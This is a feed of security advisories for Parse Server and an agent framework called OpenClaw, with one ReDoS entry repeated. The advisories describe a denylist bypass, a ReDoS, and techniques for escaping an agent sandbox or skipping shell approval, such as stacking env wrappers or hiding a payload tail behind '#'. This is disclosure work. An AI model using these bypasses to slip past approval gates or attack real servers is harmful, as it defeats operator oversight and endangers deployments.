    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server has denylist `requestKeywordDenylist` keyword scan bypass through nested object placement]]></title>
        <id>https://github.com/advisories/GHSA-q342-9w2p-57fp</id>
        <link href="https://github.com/advisories/GHSA-q342-9w2p-57fp"/>
        <updated>2026-03-10T18:44:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>requestKeywordDenylist</code> security control can be bypassed by placing any nested object or array before a prohibited keyword in the request payload. This is caused by a logic bug that stops scanning sibling keys after encountering the first nested value. Any custom <code>requestKeywordDenylist</code> entries configured by the developer are equally by-passable using the same technique.</p>
<p>All Parse Server deployments are affected. The <code>requestKeywordDenylist</code> is enabled by default.</p>
<h3 id="patches">Patches</h3>
<p>The fix replaces the recursive object scanner with an iterative stack-based traversal that processes all nested values without prematurely exiting the scan loop. This also eliminates a potential stack overflow on deeply nested payloads.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use a Cloud Code <code>beforeSave</code> trigger to validate incoming data for prohibited keywords across all classes.</p>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp">https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp</a></li>
<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1</a></li>
<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.12">https://github.com/parse-community/parse-server/releases/tag/8.6.12</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp">https://github.com/parse-community/parse-server/security/advisories/GHSA-q342-9w2p-57fp</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/8.6.12">https://github.com/parse-community/parse-server/releases/tag/8.6.12</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1">https://github.com/parse-community/parse-server/releases/tag/9.5.1-alpha.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30938">https://nvd.nist.gov/vuln/detail/CVE-2026-30938</a></li>
<li><a href="https://github.com/advisories/GHSA-q342-9w2p-57fp">https://github.com/advisories/GHSA-q342-9w2p-57fp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q342-9w2p-57fp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-10T00:57:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server has Regular Expression Denial of Service (ReDoS) via `$regex` query in LiveQuery]]></title>
        <id>https://github.com/advisories/GHSA-mf3j-86qx-cq5j</id>
        <link href="https://github.com/advisories/GHSA-mf3j-86qx-cq5j"/>
        <updated>2026-03-10T18:44:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious client can subscribe to a LiveQuery with a crafted <code>$regex</code> pattern that causes catastrophic backtracking, blocking the Node.js event loop. This makes the entire Parse Server unresponsive, affecting all clients. Any Parse Server deployment with LiveQuery enabled is affected. The attacker only needs the application ID and JavaScript key, both of which are public in client-side apps.</p>
<p>This only affects LiveQuery subscription matching, which evaluates regex in JavaScript on the Node.js event loop. Normal REST and GraphQL queries are not affected because their regex is evaluated by the database engine.</p>
<h3 id="patches">Patches</h3>
<p>Regex evaluation in LiveQuery subscription matching now runs in an isolated VM context with a configurable timeout via a new Parse Server option `liveQuery.regexTimeout, with defaults 100 ms. A regex that exceeds the timeout is treated as non-matching.</p>
<p>The protection adds approximately 50 microseconds of overhead per regex evaluation. For most applications this is negligible, but it can add up if there is a very large number of LiveQuery subscriptions that use <code>$regex</code> on the same class. For example, 10,000 concurrent regex subscriptions would add approximately 500ms of processing time per object save event on that class. Set <code>liveQuery.regexTimeout: 0</code> to disable the protection and use native regex evaluation without overhead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use the <code>beforeSubscribe</code> Cloud Code hook to reject any LiveQuery subscription that contains a <code>$regex</code> operator. Note that this also blocks the LiveQuery <code>startsWith</code>, <code>endsWith</code>, and <code>contains</code> query methods, as they use <code>$regex</code> internally.</p>
<pre><code class="language-js">// Repeat for each class that is used with LiveQuery
Parse.Cloud.beforeSubscribe('MyClass', request =&gt; {
  const where = request.query._where || {};
  for (const value of Object.values(where)) {
    if (value?.$regex) {
      throw new Parse.Error(Parse.Error.OPERATION_FORBIDDEN, '$regex not allowed in LiveQuery subscriptions');
    }
  }
});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-mf3j-86qx-cq5j">https://github.com/parse-community/parse-server/security/advisories/GHSA-mf3j-86qx-cq5j</a></li>
<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.14">https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.14</a></li>
<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.11">https://github.com/parse-community/parse-server/releases/tag/8.6.11</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-mf3j-86qx-cq5j">https://github.com/parse-community/parse-server/security/advisories/GHSA-mf3j-86qx-cq5j</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/8.6.11">https://github.com/parse-community/parse-server/releases/tag/8.6.11</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.14">https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.14</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30925">https://nvd.nist.gov/vuln/detail/CVE-2026-30925</a></li>
<li><a href="https://github.com/advisories/GHSA-mf3j-86qx-cq5j">https://github.com/advisories/GHSA-mf3j-86qx-cq5j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mf3j-86qx-cq5j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-10T00:57:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server has Regular Expression Denial of Service (ReDoS) via `$regex` query in LiveQuery]]></title>
        <id>https://github.com/advisories/GHSA-mf3j-86qx-cq5j</id>
        <link href="https://github.com/advisories/GHSA-mf3j-86qx-cq5j"/>
        <updated>2026-03-10T18:44:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious client can subscribe to a LiveQuery with a crafted <code>$regex</code> pattern that causes catastrophic backtracking, blocking the Node.js event loop. This makes the entire Parse Server unresponsive, affecting all clients. Any Parse Server deployment with LiveQuery enabled is affected. The attacker only needs the application ID and JavaScript key, both of which are public in client-side apps.</p>
<p>This only affects LiveQuery subscription matching, which evaluates regex in JavaScript on the Node.js event loop. Normal REST and GraphQL queries are not affected because their regex is evaluated by the database engine.</p>
<h3 id="patches">Patches</h3>
<p>Regex evaluation in LiveQuery subscription matching now runs in an isolated VM context with a configurable timeout via a new Parse Server option `liveQuery.regexTimeout, with defaults 100 ms. A regex that exceeds the timeout is treated as non-matching.</p>
<p>The protection adds approximately 50 microseconds of overhead per regex evaluation. For most applications this is negligible, but it can add up if there is a very large number of LiveQuery subscriptions that use <code>$regex</code> on the same class. For example, 10,000 concurrent regex subscriptions would add approximately 500ms of processing time per object save event on that class. Set <code>liveQuery.regexTimeout: 0</code> to disable the protection and use native regex evaluation without overhead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use the <code>beforeSubscribe</code> Cloud Code hook to reject any LiveQuery subscription that contains a <code>$regex</code> operator. Note that this also blocks the LiveQuery <code>startsWith</code>, <code>endsWith</code>, and <code>contains</code> query methods, as they use <code>$regex</code> internally.</p>
<pre><code class="language-js">// Repeat for each class that is used with LiveQuery
Parse.Cloud.beforeSubscribe('MyClass', request =&gt; {
  const where = request.query._where || {};
  for (const value of Object.values(where)) {
    if (value?.$regex) {
      throw new Parse.Error(Parse.Error.OPERATION_FORBIDDEN, '$regex not allowed in LiveQuery subscriptions');
    }
  }
});
</code></pre>
<h3 id="references">References</h3>
<ul>
<li>GitHub security advisory: <a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-mf3j-86qx-cq5j">https://github.com/parse-community/parse-server/security/advisories/GHSA-mf3j-86qx-cq5j</a></li>
<li>Fix Parse Server 9: <a href="https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.14">https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.14</a></li>
<li>Fix Parse Server 8: <a href="https://github.com/parse-community/parse-server/releases/tag/8.6.11">https://github.com/parse-community/parse-server/releases/tag/8.6.11</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-mf3j-86qx-cq5j">https://github.com/parse-community/parse-server/security/advisories/GHSA-mf3j-86qx-cq5j</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/8.6.11">https://github.com/parse-community/parse-server/releases/tag/8.6.11</a></li>
<li><a href="https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.14">https://github.com/parse-community/parse-server/releases/tag/9.5.0-alpha.14</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30925">https://nvd.nist.gov/vuln/detail/CVE-2026-30925</a></li>
<li><a href="https://github.com/advisories/GHSA-mf3j-86qx-cq5j">https://github.com/advisories/GHSA-mf3j-86qx-cq5j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mf3j-86qx-cq5j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-10T00:57:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: Sandboxed /acp spawn requests could initialize host ACP sessions]]></title>
        <id>https://github.com/advisories/GHSA-9q36-67vc-rrwg</id>
        <link href="https://github.com/advisories/GHSA-9q36-67vc-rrwg"/>
        <updated>2026-03-09T19:54:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Sandboxed requester sessions could reach host-side ACP session initialization through <code>/acp spawn</code>.</p>
<p>OpenClaw already blocked <code>sessions_spawn({ runtime: "acp" })</code> from sandboxed sessions, but the slash-command path initialized ACP directly without applying the same host-runtime guard first.</p>
<h3 id="affected-packages--versions">Affected Packages / Versions</h3>
<ul>
<li>npm package: <code>openclaw</code></li>
<li>Affected versions: <code>&lt;= 2026.3.2</code></li>
<li>Patched version: <code>&gt;= 2026.3.7</code></li>
</ul>
<h3 id="details">Details</h3>
<p>ACP sessions run on the host, not inside the OpenClaw sandbox. The direct ACP spawn path in <code>src/agents/acp-spawn.ts</code> already denied sandboxed requesters, but <code>/acp spawn</code> in <code>src/auto-reply/reply/commands-acp/lifecycle.ts</code> called <code>initializeSession(...)</code> without first applying the same restriction.</p>
<p>In affected versions, an already authorized sender in a sandboxed session could use <code>/acp spawn</code> to cross from sandboxed chat context into host-side ACP runtime initialization when ACP was enabled and a backend was available.</p>
<h3 id="fix-commits">Fix Commit(s)</h3>
<ul>
<li><code>61000b8e4ded919ca1a825d4700db4cb3fdc56e3</code></li>
</ul>
<h3 id="fix-details">Fix Details</h3>
<p>The fix introduced a shared ACP runtime-policy guard in <code>src/agents/acp-spawn.ts</code> and reused it from the <code>/acp spawn</code> handler in <code>src/auto-reply/reply/commands-acp/lifecycle.ts</code> before any ACP backend initialization. Regression coverage was added in <code>src/auto-reply/reply/commands-acp.test.ts</code> to prove sandboxed <code>/acp spawn</code> requests are rejected early, while existing ACP spawn behavior for non-sandboxed sessions remains unchanged.</p>
<h3 id="release-process-note">Release Process Note</h3>
<p>Patched version is pre-set to <code>2026.3.7</code> so the advisory can be published once that npm release is available.</p>
<p>Thanks @tdjackey for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-9q36-67vc-rrwg">https://github.com/openclaw/openclaw/security/advisories/GHSA-9q36-67vc-rrwg</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/61000b8e4ded919ca1a825d4700db4cb3fdc56e3">https://github.com/openclaw/openclaw/commit/61000b8e4ded919ca1a825d4700db4cb3fdc56e3</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.7">https://github.com/openclaw/openclaw/releases/tag/v2026.3.7</a></li>
<li><a href="https://github.com/advisories/GHSA-9q36-67vc-rrwg">https://github.com/advisories/GHSA-9q36-67vc-rrwg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9q36-67vc-rrwg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-09T19:54:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: system.run allow-always persistence included shell-commented payload tails]]></title>
        <id>https://github.com/advisories/GHSA-9q2p-vc84-2rwm</id>
        <link href="https://github.com/advisories/GHSA-9q2p-vc84-2rwm"/>
        <updated>2026-03-09T19:54:48.000Z</updated>
        <content type="html"><![CDATA[<p>OpenClaw's <code>system.run</code> allowlist analysis did not honor POSIX shell comment semantics when deriving <code>allow-always</code> persistence entries.</p>
<p>A caller in <code>security=allowlist</code> mode who received an <code>allow-always</code> decision could submit a shell command whose tail was commented out at runtime, for example by using an unquoted <code>#</code> before a chained payload. The runtime shell would execute only the pre-comment portion, but allowlist persistence could still analyze and store the non-executed tail as a trusted follow-up command.</p>
<p>Latest published npm version: <code>2026.3.2</code></p>
<p>Fixed on <code>main</code> on March 7, 2026 in <code>939b18475d734ed75173f59507e3ebbdfe1992b7</code> by teaching shell tokenization and chain/pipeline analysis to stop at unquoted shell comments, so allow-always persistence now tracks only commands that the shell can actually execute. Normal real chained commands and quoted <code>#</code> literals continue to work.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt;= 2026.3.2</code></li>
<li>Patched version: <code>&gt;= 2026.3.7</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>939b18475d734ed75173f59507e3ebbdfe1992b7</code></li>
</ul>
<h2 id="release-process-note">Release Process Note</h2>
<p>npm <code>2026.3.7</code> was published on March 8, 2026. This advisory is fixed in the released package.</p>
<p>Thanks @tdjackey for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-9q2p-vc84-2rwm">https://github.com/openclaw/openclaw/security/advisories/GHSA-9q2p-vc84-2rwm</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/939b18475d734ed75173f59507e3ebbdfe1992b7">https://github.com/openclaw/openclaw/commit/939b18475d734ed75173f59507e3ebbdfe1992b7</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.7">https://github.com/openclaw/openclaw/releases/tag/v2026.3.7</a></li>
<li><a href="https://github.com/advisories/GHSA-9q2p-vc84-2rwm">https://github.com/advisories/GHSA-9q2p-vc84-2rwm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9q2p-vc84-2rwm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-09T19:54:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: `operator.write` chat.send could reach admin-only config writes]]></title>
        <id>https://github.com/advisories/GHSA-hfpr-jhpq-x4rm</id>
        <link href="https://github.com/advisories/GHSA-hfpr-jhpq-x4rm"/>
        <updated>2026-03-09T19:54:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A gateway client authenticated with <code>operator.write</code> could route <code>/config set</code> or <code>/config unset</code> through <code>chat.send</code> and reach persistent config mutation even though direct config RPC methods are admin-scoped.</p>
<h3 id="affected-packages--versions">Affected Packages / Versions</h3>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Latest published vulnerable version: <code>2026.3.2</code></li>
<li>Affected range: <code>&lt;= 2026.3.2</code></li>
<li>Patched in: <code>2026.3.7</code></li>
</ul>
<h3 id="details">Details</h3>
<p>Before the fix, <code>chat.send</code> ran slash commands in an internal gateway-chat context with <code>CommandAuthorized: true</code>, and <code>/config</code> write paths only checked command authorization plus <code>commands.config</code> / <code>channels.&lt;provider&gt;.configWrites</code> gates. That allowed an authenticated <code>operator.write</code> gateway client to bridge into persistent config writes even though direct <code>config.*</code> RPC methods remain <code>operator.admin</code> scoped.</p>
<p>The fix keeps command functionality intact while restoring the intended scope boundary:</p>
<ul>
<li>persistent <code>/config set|unset</code> writes routed through gateway <code>chat.send</code> now require <code>operator.admin</code></li>
<li>read-only <code>/config show</code> remains available to normal write-scoped gateway clients</li>
<li>normal messaging-channel <code>/config</code> behavior remains unchanged</li>
</ul>
<h3 id="impact">Impact</h3>
<p>This is a real authorization mismatch, but exploitability requires an already authenticated gateway client with <code>operator.write</code>, <code>chat.send</code> access, and <code>/config</code> command support enabled. Maintainer severity is set to medium because the bug is a scoped control-plane privilege mismatch rather than a broad unauthenticated or generic remote compromise. The main consequence is unintended persistent config mutation.</p>
<h3 id="fix-commits">Fix Commit(s)</h3>
<ul>
<li><code>5f8f58ae25e2a78f31b06edcf26532d634ca554e</code></li>
</ul>
<h3 id="release-process-note">Release Process Note</h3>
<p>npm <code>2026.3.7</code> was published on March 8, 2026. This advisory is fixed in the released package.</p>
<p>Thanks @tdjackey for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-hfpr-jhpq-x4rm">https://github.com/openclaw/openclaw/security/advisories/GHSA-hfpr-jhpq-x4rm</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/5f8f58ae25e2a78f31b06edcf26532d634ca554e">https://github.com/openclaw/openclaw/commit/5f8f58ae25e2a78f31b06edcf26532d634ca554e</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.7">https://github.com/openclaw/openclaw/releases/tag/v2026.3.7</a></li>
<li><a href="https://github.com/advisories/GHSA-hfpr-jhpq-x4rm">https://github.com/advisories/GHSA-hfpr-jhpq-x4rm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfpr-jhpq-x4rm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-09T19:54:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: system.run wrapper-depth boundary could skip shell approval gating]]></title>
        <id>https://github.com/advisories/GHSA-r6qf-8968-wj9q</id>
        <link href="https://github.com/advisories/GHSA-r6qf-8968-wj9q"/>
        <updated>2026-03-09T19:54:28.000Z</updated>
        <content type="html"><![CDATA[<p>OpenClaw's <code>system.run</code> dispatch-wrapper handling applied different depth-boundary rules to shell-wrapper approval detection and execution planning.</p>
<p>With exactly four transparent dispatch wrappers such as repeated <code>env</code> invocations before <code>/bin/sh -c</code>, the approval classifier could stop treating the command as a shell wrapper at the depth boundary while execution planning still unwrapped through to the shell payload. In <code>security=allowlist</code> mode, that mismatch could skip the expected approval-required path for the shell wrapper invocation.</p>
<p>Latest published npm version: <code>2026.3.2</code></p>
<p>Fixed on <code>main</code> on March 7, 2026 in <code>2fc95a7cfc1eb9306356510b0251b6d51fb1c0b0</code> by keeping shell-wrapper classification active at the configured dispatch depth boundary and only failing closed beyond that boundary. This aligns approval gating with the execution plan. Legitimate shallow dispatch-wrapper usage continues to work.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt;= 2026.3.2</code></li>
<li>Patched version: <code>&gt;= 2026.3.7</code></li>
</ul>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>2fc95a7cfc1eb9306356510b0251b6d51fb1c0b0</code></li>
</ul>
<h2 id="release-process-note">Release Process Note</h2>
<p>npm <code>2026.3.7</code> was published on March 8, 2026. This advisory is fixed in the released package.</p>
<p>Thanks @tdjackey for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-r6qf-8968-wj9q">https://github.com/openclaw/openclaw/security/advisories/GHSA-r6qf-8968-wj9q</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/2fc95a7cfc1eb9306356510b0251b6d51fb1c0b0">https://github.com/openclaw/openclaw/commit/2fc95a7cfc1eb9306356510b0251b6d51fb1c0b0</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.7">https://github.com/openclaw/openclaw/releases/tag/v2026.3.7</a></li>
<li><a href="https://github.com/advisories/GHSA-r6qf-8968-wj9q">https://github.com/advisories/GHSA-r6qf-8968-wj9q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r6qf-8968-wj9q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-09T19:54:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] OpenClaw: fetch-guard forwards custom authorization headers across cross-origin redirects]]></title>
        <id>https://github.com/advisories/GHSA-6mgf-v5j7-45cr</id>
        <link href="https://github.com/advisories/GHSA-6mgf-v5j7-45cr"/>
        <updated>2026-03-09T19:54:23.000Z</updated>
        <content type="html"><![CDATA[<p>OpenClaw's <code>fetchWithSsrFGuard(...)</code> followed cross-origin redirects while preserving arbitrary caller-supplied headers except for a narrow denylist (<code>Authorization</code>, <code>Proxy-Authorization</code>, <code>Cookie</code>, <code>Cookie2</code>). This allowed custom authorization headers such as <code>X-Api-Key</code>, <code>Private-Token</code>, and similar sensitive headers to be forwarded to a different origin after a redirect.</p>
<p>The fix switches cross-origin redirect handling from a narrow sensitive-header denylist to a safe-header allowlist, so only benign headers such as content negotiation and cache validators survive an origin change.</p>
<h2 id="affected-packages--versions">Affected Packages / Versions</h2>
<ul>
<li>Package: <code>openclaw</code> (npm)</li>
<li>Affected versions: <code>&lt;= 2026.3.2</code></li>
<li>Patched version: <code>2026.3.7</code></li>
<li>Latest published npm version at patch time: <code>2026.3.2</code></li>
</ul>
<h2 id="impact">Impact</h2>
<p>A remote service that could trigger a redirect across origins could receive custom authorization credentials attached by OpenClaw callers. This can expose API keys, bearer-style custom headers, or private token headers intended only for the original destination.</p>
<h2 id="fix-commits">Fix Commit(s)</h2>
<ul>
<li><code>46715371b0612a6f9114dffd1466941ac476cef5</code></li>
</ul>
<h2 id="verification">Verification</h2>
<ul>
<li><code>pnpm check</code> passed</li>
<li><code>pnpm test:fast</code> passed</li>
<li>Focused redirect regression tests passed</li>
<li><code>pnpm exec vitest run --config vitest.gateway.config.ts</code> still has unrelated current-<code>main</code> failures in <code>src/gateway/server-channels.test.ts</code> and <code>src/gateway/server-methods/agents-mutate.test.ts</code></li>
</ul>
<h2 id="release-process-note">Release Process Note</h2>
<p>npm <code>2026.3.7</code> was published on March 8, 2026. This advisory is fixed in the released package.</p>
<p>Thanks @Rickidevs for reporting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-6mgf-v5j7-45cr">https://github.com/openclaw/openclaw/security/advisories/GHSA-6mgf-v5j7-45cr</a></li>
<li><a href="https://github.com/openclaw/openclaw/commit/46715371b0612a6f9114dffd1466941ac476cef5">https://github.com/openclaw/openclaw/commit/46715371b0612a6f9114dffd1466941ac476cef5</a></li>
<li><a href="https://github.com/openclaw/openclaw/releases/tag/v2026.3.7">https://github.com/openclaw/openclaw/releases/tag/v2026.3.7</a></li>
<li><a href="https://github.com/advisories/GHSA-6mgf-v5j7-45cr">https://github.com/advisories/GHSA-6mgf-v5j7-45cr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6mgf-v5j7-45cr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-09T19:54:20.000Z</published>
    </entry>
</feed>